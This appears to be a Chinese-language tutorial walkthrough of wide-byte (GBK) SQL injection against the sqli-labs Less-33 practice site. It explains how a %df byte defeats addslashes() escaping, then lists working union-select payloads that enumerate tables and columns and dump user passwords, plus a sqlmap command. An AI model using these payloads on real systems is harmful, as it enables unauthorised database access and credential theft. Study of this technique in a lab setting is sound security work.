# 宽字节注入

宽字节注入要求：

1、数据库的编码为GBK

![image-20220310090139124](https://image.3001.net/images/20220311/1646978391_622ae557f1a1da97bdd31.png!small)

2、使用了addslashes（）函数

addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：

  * 单引号（'）

  * 双引号（"）

  * 反斜杠（\）

  * NULL

![image-20220310090200647](https://image.3001.net/images/20220311/1646978392_622ae558a5cd20d1ff660.png!small)

## 一、单引号探测

    
    
    http://localhost:8899/sqli-lab/Less-33/index.php?id=1'

![image-20220310085243187](https://image.3001.net/images/20220311/1646978394_622ae55a09ab4a196f469.png!small)

这里我们我们发现输入的 ' 直接被转义成 了 \'
，在一般情况下，此处是不存在SQL注入漏洞的，不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”,导致单引号成功逃逸，可以闭合sql语句,从而完成sql注入。

  

## 二、使用宽字节注入绕过addslashes()函数使 ' 逃逸

    
    
    http://localhost:8899/sqli-lab/Less-33/index.php?id=-1%df' union select 1,database(),user()--+

![image-20220310090842710](https://image.3001.net/images/20220311/1646978396_622ae55c2fed92d0a78aa.png!small)

在单引号前面输入%df让单引号成功逃逸

%df 吃掉 \ 具体的原因是 urlencode(') = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的
mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，这时%df%5c 就是一个汉字，%27
则作为一个单独的符号在外面，同时也就达到了我们的目的。

  

## 三、爆表名 单引号再次被转义

    
    
    http://localhost:8899/sqli-lab/Less-33/index.php?id=-1%df' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema='security'--+

![image-20220310091105022](https://image.3001.net/images/20220311/1646978398_622ae55ec567d911cd195.png!small)

我们获取了数据库名，用户，版本等数据库信息，接着对当前数据库爆表名时，table_schema='security'中的单引号再次被转义，继续使用%df已经不适用，因为%df%5构成汉字，会影响数据库名称，如：table_schema=連'security連'，实际数据库名并不是这个，具体解决方法有以下俩种

### 解决方法：

#### 1、database（）代替库名

    
    
    http://localhost:8899/sqli-lab/Less-33/index.php?id=-1%df' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()--+

![image-20220310091709041](https://image.3001.net/images/20220311/1646978401_622ae561ce6cafdc93b18.png!small)

#### 2、将库名转为16进制

    
    
    http://localhost:8899/sqli-lab/Less-33/index.php?id=-1%df' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=0x7365637572697479--+

注意这里0x7365637572697479是security的16进制

![image-20220310092008523](https://image.3001.net/images/20220311/1646978404_622ae5649bdc7e6b996b9.png!small)

## 四、爆列名

    
    
    http://localhost:8899/sqli-lab/Less-33/index.php?id=-1%df' union select 1,group_concat(column_name),database() from information_schema.columns where table_name=0x7573657273--+

![image-20220310092552353](https://image.3001.net/images/20220311/1646978407_622ae567d297c64c0f8b3.png!small)

## 五、爆数据

    
    
    http://localhost:8899/sqli-lab/Less-33/index.php?id=-1%df' union select 1,group_concat(id),group_concat(password) from users--+

![image-20220310092817672](https://image.3001.net/images/20220311/1646978410_622ae56a57a11722696ba.png!small)

## 六、工具注入

    
    
    sqlmap.py -u http://localhost:8899/sqli-lab/Less-33/index.php?id=1%df%27 -D "security" --tables

![](https://image.3001.net/images/20220311/1646978412_622ae56c828d5264a5fd7.png!small)

